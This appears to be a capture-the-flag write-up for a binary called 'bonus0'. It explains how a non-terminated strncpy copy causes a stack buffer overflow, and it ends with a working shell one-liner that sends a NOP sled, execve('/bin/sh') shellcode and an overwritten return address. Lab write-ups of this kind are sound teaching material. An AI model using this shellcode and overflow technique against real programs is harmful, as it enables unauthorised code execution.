We have two buffers of 20 bytes that we can use for our bof exploit.
In both case we can read up to **4096** chars, then `strncpy` will then be called to copy the 20 first bytes inside ou buffers. But if the input string is longer than 20 bytes then the buffer will not be NULL-terminated, so we can store whatever we inside of it. We'll use this to write our **shellcode** in the first buffer after a **NOP sled**. We juste need an address inside our **NOP sled** to jump to it : `0xbfffe6bd` (could have be any in range(buffer start address, 4096)).

We now want to overflow the first buffer of 42 chars. The program will cat inside of it : `buf1 + buf2 + ' ' + buf2`, that's equal to `40 + 1 + 20` bytes written to our buffer and overflow it. Thanks to our the [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) we know that the offset to `eip` is 9 if we max out the buffers.

```shell
(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "A" * 9 + "\xbd\xe6\xff\xbf" + "A" * 7' ; cat -) | ./bonus0
```
